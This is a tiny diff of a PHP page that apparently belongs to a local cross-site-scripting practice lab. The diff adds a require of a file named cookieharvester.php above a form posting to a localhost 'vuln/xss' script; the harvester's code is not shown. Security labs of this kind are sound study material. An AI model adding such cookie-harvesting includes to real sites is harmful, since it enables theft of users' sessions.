@@ -1,4 +1,5 @@
 <?php
+require "cookieharvester.php";
 ?>
 <form action="http://localhost/vuln/xss/secondexample.php" method="post">
     <input type="text" name="q" value="" /><br>
